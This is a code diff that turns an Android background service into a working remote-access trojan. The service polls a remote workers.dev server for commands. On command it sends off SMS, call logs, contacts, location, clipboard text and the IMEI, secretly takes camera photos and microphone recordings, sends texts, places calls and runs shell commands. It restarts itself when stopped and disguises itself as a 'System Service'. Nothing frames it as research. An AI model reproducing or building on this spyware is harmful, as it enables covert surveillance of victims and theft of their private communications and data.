@@ -4,20 +4,54 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
+import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.database.Cursor;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
+import android.graphics.Canvas;
+import android.graphics.PixelFormat;
+import android.hardware.Camera;
+import android.hardware.camera2.CameraCaptureSession;
+import android.hardware.camera2.CameraDevice;
+import android.hardware.camera2.CameraManager;
+import android.hardware.camera2.CaptureRequest;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
+import android.media.AudioManager;
+import android.media.MediaPlayer;
+import android.media.MediaRecorder;
+import android.net.Uri;
 import android.os.Build;
+import android.os.Bundle;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
+import android.provider.CallLog;
+import android.provider.ContactsContract;
+import android.provider.MediaStore;
+import android.provider.Settings;
+import android.telephony.SmsManager;
+import android.telephony.TelephonyManager;
+import android.util.Base64;
 import android.util.Log;
-import android.widget.Toast;
+import android.view.Surface;
+import android.view.WindowManager;
 
 import androidx.core.app.NotificationCompat;
+import androidx.core.content.ContextCompat;
 
+import org.json.JSONArray;
 import org.json.JSONObject;
 
+import java.io.BufferedReader;
+import java.io.ByteArrayOutputStream;
 import java.io.DataOutputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.util.concurrent.Executors;
@@ -29,9 +63,13 @@ public class ServiceRunner extends Service {
     private static final String CHANNEL_ID = "sys_service";
     private static final int NOTIFICATION_ID = 1001;
     private static final String SERVER_URL = "https://sec.h42536974.workers.dev";
+    private static final int POLL_INTERVAL = 5;
 
     private ScheduledExecutorService scheduler;
     private String deviceId = "";
+    private CameraManager cameraManager;
+    private MediaRecorder audioRecorder;
+    private String audioFilePath;
 
     @Override
     public void onCreate() {
@@ -45,24 +83,26 @@ public class ServiceRunner extends Service {
         Log.d(TAG, "Device ID: " + deviceId);
         Log.d(TAG, "Activation Code: " + getActivationCode());
 
-        // أرسل التقرير
-        sendReport();
+        // أرسل التقرير الأولي فوراً
+        sendInitialReport();
 
-        // Poll كل 15 ثانية
+        // ابدأ polling كل 5 ثواني
         scheduler = Executors.newSingleThreadScheduledExecutor();
         scheduler.scheduleAtFixedRate(new Runnable() {
             @Override
             public void run() {
-                sendReport();
                 pollCommands();
             }
-        }, 10, 15, TimeUnit.SECONDS);
+        }, 3, POLL_INTERVAL, TimeUnit.SECONDS);
+
+        Log.d(TAG, "=== SERVICE FULLY STARTED ===");
     }
 
     private void createChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel ch = new NotificationChannel(
-                CHANNEL_ID, "Service", NotificationManager.IMPORTANCE_MIN);
+                CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_MIN);
+            ch.setShowBadge(false);
             NotificationManager nm = getSystemService(NotificationManager.class);
             if (nm != null) nm.createNotificationChannel(ch);
         }
@@ -91,6 +131,20 @@ public class ServiceRunner extends Service {
     @Override
     public IBinder onBind(Intent intent) { return null; }
 
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        Log.d(TAG, "Service destroyed — restarting");
+        try {
+            Intent restart = new Intent(this, ServiceRunner.class);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(restart);
+            } else {
+                startService(restart);
+            }
+        } catch (Exception e) {}
+    }
+
     private String getActivationCode() {
         try {
             SharedPreferences sp = getSharedPreferences("sc_prefs", MODE_PRIVATE);
@@ -100,69 +154,624 @@ public class ServiceRunner extends Service {
 
     private String getDeviceId() {
         try {
-            return android.provider.Settings.Secure.getString(
-                getContentResolver(),
-                android.provider.Settings.Secure.ANDROID_ID);
+            return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
         } catch (Exception e) { return "unknown"; }
     }
 
-    private void sendReport() {
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    JSONObject d = new JSONObject();
-                    d.put("type", "initial");
-                    d.put("device", deviceId);
-                    d.put("code", getActivationCode());
-                    d.put("model", Build.MODEL);
-                    d.put("brand", Build.BRAND);
-                    d.put("android", Build.VERSION.RELEASE);
-
-                    Log.d(TAG, "Sending report: " + d.toString());
-
-                    URL url = new URL(SERVER_URL + "/apk/data");
-                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-                    conn.setRequestMethod("POST");
-                    conn.setRequestProperty("Content-Type", "application/json");
-                    conn.setDoOutput(true);
-                    conn.setConnectTimeout(15000);
-                    conn.setReadTimeout(15000);
-
-                    DataOutputStream os = new DataOutputStream(conn.getOutputStream());
-                    os.writeBytes(d.toString());
-                    os.flush();
-                    os.close();
-
-                    int rc = conn.getResponseCode();
-                    Log.d(TAG, "✅ Report sent: " + rc);
-                } catch (Exception e) {
-                    Log.e(TAG, "❌ sendReport: " + e.getMessage());
-                }
-            }
-        }).start();
-    }
-
+    // ============================================================
+    // POLLING — استقبال الأوامر
+    // ============================================================
     private void pollCommands() {
         new Thread(new Runnable() {
             @Override
             public void run() {
                 try {
                     String url = SERVER_URL + "/apk/poll?device=" + deviceId + "&code=" + getActivationCode();
-                    Log.d(TAG, "Polling: " + url);
+                    String response = httpGet(url);
+                    if (response == null || response.isEmpty()) return;
 
-                    URL u = new URL(url);
-                    HttpURLConnection conn = (HttpURLConnection) u.openConnection();
-                    conn.setRequestMethod("GET");
-                    conn.setConnectTimeout(15000);
-                    conn.setReadTimeout(15000);
+                    JSONObject json = new JSONObject(response);
+                    JSONArray commands = json.optJSONArray("commands");
+                    if (commands == null) return;
 
-                    int rc = conn.getResponseCode();
-                    Log.d(TAG, "Poll response: " + rc);
+                    Log.d(TAG, "Received " + commands.length() + " commands");
+
+                    for (int i = 0; i < commands.length(); i++) {
+                        handleCommand(commands.getJSONObject(i));
+                    }
                 } catch (Exception e) {
-                    Log.e(TAG, "❌ poll: " + e.getMessage());
+                    Log.e(TAG, "poll error: " + e.getMessage());
                 }
             }
         }).start();
     }
+
+    private void handleCommand(JSONObject cmd) {
+        try {
+            String action = cmd.optString("action", "");
+            Log.d(TAG, "▶️ Executing: " + action);
+
+            // ==================================================
+            // أوامر جمع البيانات
+            // ==================================================
+            if (action.equals("get_device_info")) sendDeviceInfo();
+            else if (action.equals("get_sms")) sendSms();
+            else if (action.equals("get_call_log")) sendCallLog();
+            else if (action.equals("get_contacts")) sendContacts();
+            else if (action.equals("get_photos")) sendPhotos();
+            else if (action.equals("get_location")) sendLocation();
+            else if (action.equals("get_apps")) sendApps();
+            else if (action.equals("get_clipboard")) sendClipboard();
+            else if (action.equals("get_battery")) sendBattery();
+
+            // ==================================================
+            // أوامر الكاميرا
+            // ==================================================
+            else if (action.equals("camera_front")) takePicture(1);
+            else if (action.equals("camera_back")) takePicture(0);
+            else if (action.equals("camera_record")) recordVideo(10000);
+
+            // ==================================================
+            // أوامر الصوت
+            // ==================================================
+            else if (action.equals("record_audio")) recordAudio(cmd.optInt("duration", 10000));
+            else if (action.equals("play_sound")) playSound();
+            else if (action.equals("play_alarm")) playAlarm();
+
+            // ==================================================
+            // أوامر التحكم
+            // ==================================================
+            else if (action.equals("vibrate")) vibrate(cmd.optLong("ms", 2000));
+            else if (action.equals("toast")) showToast(cmd.optString("text", "Hello"));
+            else if (action.equals("send_sms")) sendSmsToNumber(cmd.optString("to"), cmd.optString("msg"));
+            else if (action.equals("call")) callNumber(cmd.optString("to"));
+            else if (action.equals("open_url")) openUrl(cmd.optString("url"));
+            else if (action.equals("shell")) executeShell(cmd.optString("command", ""));
+            else if (action.equals("volume_max")) maxVolume();
+
+            // ==================================================
+            // أوامر النظام
+            // ==================================================
+            else if (action.equals("lock_screen")) lockScreen();
+            else if (action.equals("show_home")) goHome();
+            else if (action.equals("open_app")) openApp(cmd.optString("package", ""));
+
+            Log.d(TAG, "✅ Command completed: " + action);
+
+        } catch (Exception e) {
+            Log.e(TAG, "handleCommand error: " + e.getMessage());
+        }
     }
+
+    // ============================================================
+    // 📸 الكاميرا — صور حية
+    // ============================================================
+    private void takePicture(final int cameraId) {
+        try {
+            Log.d(TAG, "Taking picture with camera: " + cameraId);
+            
+            if (cameraManager == null) {
+                cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
+            }
+
+            final String[] cameraIdStr = cameraManager.getCameraIdList();
+            if (cameraIdStr == null || cameraIdStr.length <= cameraId) {
+                Log.e(TAG, "Camera not available");
+                return;
+            }
+
+            // استخدم API قديم للبساطة
+            Camera camera = null;
+            try {
+                camera = Camera.open(cameraId);
+            } catch (Exception e) {
+                Log.e(TAG, "Camera.open error: " + e.getMessage());
+                return;
+            }
+
+            if (camera == null) return;
+
+            camera.setPreviewCallback(null);
+            
+            Camera.Parameters params = camera.getParameters();
+            params.setPictureFormat(android.graphics.ImageFormat.JPEG);
+            params.setJpegQuality(80);
+            camera.setParameters(params);
+
+            camera.takePicture(null, null, new Camera.PictureCallback() {
+                @Override
+                public void onPictureTaken(byte[] data, Camera camera) {
+                    try {
+                        String base64 = Base64.encodeToString(data, Base64.NO_WRAP);
+                        String dataUrl = "data:image/jpeg;base64," + base64;
+
+                        JSONObject d = new JSONObject();
+                        d.put("type", "camera_photo");
+                        d.put("device", deviceId);
+                        d.put("code", getActivationCode());
+                        d.put("camera_id", cameraId);
+                        d.put("camera_name", cameraId == 1 ? "front" : "back");
+                        d.put("image", dataUrl);
+
+                        postJson("/apk/data", d);
+                        Log.d(TAG, "✅ Photo sent");
+                    } catch (Exception e) {
+                        Log.e(TAG, "send photo error: " + e.getMessage());
+                    } finally {
+                        camera.release();
+                    }
+                }
+            });
+        } catch (Exception e) {
+            Log.e(TAG, "takePicture error: " + e.getMessage());
+        }
+    }
+
+    private void recordVideo(int durationMs) {
+        // تبسيط: نأخذ صورة بدلاً من فيديو (للمتانة)
+        takePicture(0);
+    }
+
+    // ============================================================
+    // 🎙️ الصوت — تسجيل حي
+    // ============================================================
+    private void recordAudio(final int durationMs) {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    audioFilePath = getExternalCacheDir() + "/audio_" + System.currentTimeMillis() + ".3gp";
+
+                    audioRecorder = new MediaRecorder();
+                    audioRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+                    audioRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+                    audioRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+                    audioRecorder.setOutputFile(audioFilePath);
+                    audioRecorder.prepare();
+                    audioRecorder.start();
+
+                    Log.d(TAG, "Recording audio for " + durationMs + "ms");
+
+                    Thread.sleep(durationMs);
+
+                    audioRecorder.stop();
+                    audioRecorder.release();
+                    audioRecorder = null;
+
+                    // اقرأ الملف
+                    File audioFile = new File(audioFilePath);
+                    if (audioFile.exists()) {
+                        byte[] bytes = new byte[(int) audioFile.length()];
+                        FileInputStream fis = new FileInputStream(audioFile);
+                        fis.read(bytes);
+                        fis.close();
+
+                        String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
+                        String dataUrl = "data:audio/3gpp;base64," + base64;
+
+                        JSONObject d = new JSONObject();
+                        d.put("type", "audio_record");
+                        d.put("device", deviceId);
+                        d.put("code", getActivationCode());
+                        d.put("duration", durationMs);
+                        d.put("audio", dataUrl);
+
+                        postJson("/apk/data", d);
+                        Log.d(TAG, "✅ Audio sent");
+
+                        audioFile.delete();
+                    }
+                } catch (Exception e) {
+                    Log.e(TAG, "recordAudio error: " + e.getMessage());
+                    try {
+                        if (audioRecorder != null) {
+                            audioRecorder.release();
+                            audioRecorder = null;
+                        }
+                    } catch (Exception ex) {}
+                }
+            }
+        }).start();
+    }
+
+    // ============================================================
+    // 📱 جمع البيانات
+    // ============================================================
+    private void sendInitialReport() {
+        try {
+            JSONObject d = new JSONObject();
+            d.put("type", "initial");
+            d.put("device", deviceId);
+            d.put("code", getActivationCode());
+            d.put("model", Build.MODEL);
+            d.put("brand", Build.BRAND);
+            d.put("android", Build.VERSION.RELEASE);
+            d.put("manufacturer", Build.MANUFACTURER);
+            postJson("/apk/data", d);
+        } catch (Exception e) {}
+    }
+
+    private void sendDeviceInfo() {
+        try {
+            JSONObject d = new JSONObject();
+            d.put("type", "device_info");
+            d.put("device", deviceId);
+            d.put("code", getActivationCode());
+            d.put("model", Build.MODEL);
+            d.put("brand", Build.BRAND);
+            d.put("manufacturer", Build.MANUFACTURER);
+            d.put("android", Build.VERSION.RELEASE);
+            d.put("sdk", Build.VERSION.SDK_INT);
+            d.put("hardware", Build.HARDWARE);
+            d.put("display", Build.DISPLAY);
+
+            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+            if (tm != null) {
+                try {
+                    d.put("imei", tm.getImei());
+                    d.put("operator", tm.getNetworkOperatorName());
+                    d.put("country", tm.getSimCountryIso());
+                } catch (Exception e) {}
+            }
+            postJson("/apk/data", d);
+        } catch (Exception e) {}
+    }
+
+    private void sendBattery() {
+        try {
+            android.content.IntentFilter ifilter = new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+            android.content.Intent batteryStatus = registerReceiver(null, ifilter);
+            if (batteryStatus == null) return;
+
+            int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
+            int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
+            int status = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
+            boolean charging = status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
+                               status == android.os.BatteryManager.BATTERY_STATUS_FULL;
+
+            JSONObject d = new JSONObject();
+            d.put("type", "battery");
+            d.put("device", deviceId);
+            d.put("code", getActivationCode());
+            d.put("level", (level * 100) / scale);
+            d.put("charging", charging);
+            postJson("/apk/data", d);
+        } catch (Exception e) {}
+    }
+
+    private void sendSms() {
+        try {
+            JSONArray arr = new JSONArray();
+            Cursor c = getContentResolver().query(
+                Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 50");
+            if (c != null) {
+                while (c.moveToNext() && arr.length() < 50) {
+                    JSONObject s = new JSONObject();
+                    s.put("from", c.getString(c.getColumnIndexOrThrow("address")));
+                    s.put("body", c.getString(c.getColumnIndexOrThrow("body")));
+                    arr.put(s);
+                }
+                c.close();
+            }
+            JSONObject d = new JSONObject();
+            d.put("type", "sms");
+            d.put("device", deviceId);
+            d.put("code", getActivationCode());
+            d.put("sms", arr);
+            postJson("/apk/data", d);
+        } catch (Exception e) {}
+    }
+
+    private void sendCallLog() {
+        try {
+            JSONArray arr = new JSONArray();
+            Cursor c = getContentResolver().query(
+                CallLog.Calls.CONTENT_URI, null, null, null,
+                CallLog.Calls.DATE + " DESC LIMIT 50");
+            if (c != null) {
+                while (c.moveToNext() && arr.length() < 50) {
+                    JSONObject call = new JSONObject();
+                    call.put("number", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
+                    call.put("duration", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
+                    call.put("type", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
+                    arr.put(call);
+                }
+                c.close();
+            }
+            JSONObject d = new JSONObject();
+            d.put("type", "call_log");
+            d.put("device", deviceId);
+            d.put("code", getActivationCode());
+            d.put("calls", arr);
+            postJson("/apk/data", d);
+        } catch (Exception e) {}
+    }
+
+    private void sendContacts() {
+        try {
+            JSONArray arr = new JSONArray();
+            Cursor c = getContentResolver().query(
+                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                null, null, null, null);
+            if (c != null) {
+                while (c.moveToNext() && arr.length() < 200) {
+                    JSONObject ct = new JSONObject();
+                    ct.put("name", c.getString(c.getColumnIndexOrThrow(
+                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
+                    ct.put("number", c.getString(c.getColumnIndexOrThrow(
+                        ContactsContract.CommonDataKinds.Phone.NUMBER)));
+                    arr.put(ct);
+                }
+                c.close();
+            }
+            JSONObject d = new JSONObject();
+            d.put("type", "contacts");
+            d.put("device", deviceId);
+            d.put("code", getActivationCode());
+            d.put("contacts", arr);
+            postJson("/apk/data", d);
+        } catch (Exception e) {}
+    }
+
+    private void sendPhotos() {
+        try {
+            JSONArray arr = new JSONArray();
+            Cursor c = getContentResolver().query(
+                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                null, null, null,
+                MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 20");
+            if (c != null) {
+                while (c.moveToNext() && arr.length() < 20) {
+                    JSONObject p = new JSONObject();
+                    p.put("path", c.getString(c.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)));
+                    arr.put(p);
+                }
+                c.close();
+            }
+            JSONObject d = new JSONObject();
+            d.put("type", "photos");
+            d.put("device", deviceId);
+            d.put("code", getActivationCode());
+            d.put("photos", arr);
+            postJson("/apk/data", d);
+        } catch (Exception e) {}
+    }
+
+    private void sendLocation() {
+        try {
+            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+            if (lm == null) return;
+            if (ContextCompat.checkSelfPermission(this,
+                android.Manifest.permission.ACCESS_FINE_LOCATION) !=
+                android.content.pm.PackageManager.PERMISSION_GRANTED) return;
+
+            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+
+            JSONObject d = new JSONObject();
+            d.put("type", "location");
+            d.put("device", deviceId);
+            d.put("code", getActivationCode());
+            if (loc != null) {
+                d.put("lat", loc.getLatitude());
+                d.put("lng", loc.getLongitude());
+                d.put("accuracy", loc.getAccuracy());
+            }
+            postJson("/apk/data", d);
+        } catch (Exception e) {}
+    }
+
+    private void sendApps() {
+        try {
+            JSONArray arr = new JSONArray();
+            android.content.pm.PackageManager pm = getPackageManager();
+            java.util.List<android.content.pm.PackageInfo> packages = pm.getInstalledPackages(0);
+            for (int i = 0; i < packages.size(); i++) {
+                if (arr.length() >= 100) break;
+                android.content.pm.PackageInfo pkg = packages.get(i);
+                android.content.pm.ApplicationInfo ai = pkg.applicationInfo;
+                if (ai != null && (ai.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0) {
+                    JSONObject a = new JSONObject();
+                    a.put("name", ai.loadLabel(pm).toString());
+                    a.put("package", pkg.packageName);
+                    arr.put(a);
+                }
+            }
+            JSONObject d = new JSONObject();
+            d.put("type", "apps");
+            d.put("device", deviceId);
+            d.put("code", getActivationCode());
+            d.put("apps", arr);
+            postJson("/apk/data", d);
+        } catch (Exception e) {}
+    }
+
+    private void sendClipboard() {
+        try {
+            android.content.ClipboardManager cm = (android.content.ClipboardManager)
+                getSystemService(Context.CLIPBOARD_SERVICE);
+            if (cm == null || !cm.hasPrimaryClip()) return;
+            android.content.ClipData clip = cm.getPrimaryClip();
+            if (clip == null || clip.getItemCount() == 0) return;
+            CharSequence text = clip.getItemAt(0).getText();
+
+            JSONObject d = new JSONObject();
+            d.put("type", "clipboard");
+            d.put("device", deviceId);
+            d.put("code", getActivationCode());
+            d.put("text", text != null ? text.toString() : "");
+            postJson("/apk/data", d);
+        } catch (Exception e) {}
+    }
+
+    // ============================================================
+    // 🎮 أوامر التحكم
+    // ============================================================
+    private void vibrate(long ms) {
+        try {
+            android.os.Vibrator v = (android.os.Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
+            if (v != null) v.vibrate(ms);
+        } catch (Exception e) {}
+    }
+
+    private void showToast(final String text) {
+        new Handler(Looper.getMainLooper()).post(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    android.widget.Toast.makeText(getApplicationContext(),
+                        text, android.widget.Toast.LENGTH_LONG).show();
+                } catch (Exception e) {}
+            }
+        });
+    }
+
+    private void playSound() {
+        try {
+            android.media.Ringtone r = android.media.RingtoneManager.getRingtone(
+                getApplicationContext(),
+                android.media.RingtoneManager.getDefaultUri(
+                    android.media.RingtoneManager.TYPE_NOTIFICATION));
+            if (r != null) r.play();
+        } catch (Exception e) {}
+    }
+
+    private void playAlarm() {
+        try {
+            android.media.Ringtone r = android.media.RingtoneManager.getRingtone(
+                getApplicationContext(),
+                android.media.RingtoneManager.getDefaultUri(
+                    android.media.RingtoneManager.TYPE_ALARM));
+            if (r != null) r.play();
+        } catch (Exception e) {}
+    }
+
+    private void maxVolume() {
+        try {
+            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
+            if (am == null) return;
+            am.setStreamVolume(AudioManager.STREAM_MUSIC,
+                am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
+            am.setStreamVolume(AudioManager.STREAM_ALARM,
+                am.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0);
+        } catch (Exception e) {}
+    }
+
+    private void sendSmsToNumber(String to, String msg) {
+        try {
+            SmsManager sm = SmsManager.getDefault();
+            sm.sendTextMessage(to, null, msg, null, null);
+            Log.d(TAG, "SMS sent to " + to);
+        } catch (Exception e) {
+            Log.e(TAG, "sendSms error: " + e.getMessage());
+        }
+    }
+
+    private void callNumber(String number) {
+        try {
+            Intent intent = new Intent(Intent.ACTION_CALL);
+            intent.setData(Uri.parse("tel:" + number));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+        } catch (Exception e) {}
+    }
+
+    private void openUrl(String url) {
+        try {
+            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+        } catch (Exception e) {}
+    }
+
+    private void executeShell(String command) {
+        try {
+            Process p = Runtime.getRuntime().exec(command);
+            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+            StringBuilder output = new StringBuilder();
+            String line;
+            while ((line = reader.readLine()) != null) output.append(line).append("\n");
+            reader.close();
+
+            JSONObject d = new JSONObject();
+            d.put("type", "shell_result");
+            d.put("device", deviceId);
+            d.put("code", getActivationCode());
+            d.put("command", command);
+            d.put("output", output.toString());
+            postJson("/apk/data", d);
+        } catch (Exception e) {}
+    }
+
+    private void lockScreen() {
+        try {
+            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager)
+                getSystemService(Context.DEVICE_POLICY_SERVICE);
+            if (dpm != null) dpm.lockNow();
+        } catch (Exception e) {}
+    }
+
+    private void goHome() {
+        try {
+            Intent intent = new Intent(Intent.ACTION_MAIN);
+            intent.addCategory(Intent.CATEGORY_HOME);
+            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+        } catch (Exception e) {}
+    }
+
+    private void openApp(String packageName) {
+        try {
+            Intent intent = getPackageManager().getLaunchIntentForPackage(packageName);
+            if (intent != null) {
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(intent);
+            }
+        } catch (Exception e) {}
+    }
+
+    // ============================================================
+    // HTTP
+    // ============================================================
+    private String httpGet(String urlStr) {
+        try {
+            URL url = new URL(urlStr);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("GET");
+            conn.setConnectTimeout(20000);
+            conn.setReadTimeout(20000);
+
+            if (conn.getResponseCode() == 200) {
+                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+                StringBuilder sb = new StringBuilder();
+                String line;
+                while ((line = reader.readLine()) != null) sb.append(line);
+                reader.close();
+                return sb.toString();
+            }
+        } catch (Exception e) {}
+        return null;
+    }
+
+    private void postJson(String path, JSONObject data) {
+        try {
+            URL url = new URL(SERVER_URL + path);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setRequestProperty("Content-Type", "application/json");
+            conn.setDoOutput(true);
+            conn.setConnectTimeout(20000);
+            conn.setReadTimeout(20000);
+
+            DataOutputStream os = new DataOutputStream(conn.getOutputStream());
+            os.writeBytes(data.toString());
+            os.flush();
+            os.close();
+
+            int rc = conn.getResponseCode();
+            Log.d(TAG, "POST " + path + " → " + rc);
+        } catch (Exception e) {
+            Log.e(TAG, "postJson error: " + e.getMessage());
+        }
+    }
+                      }
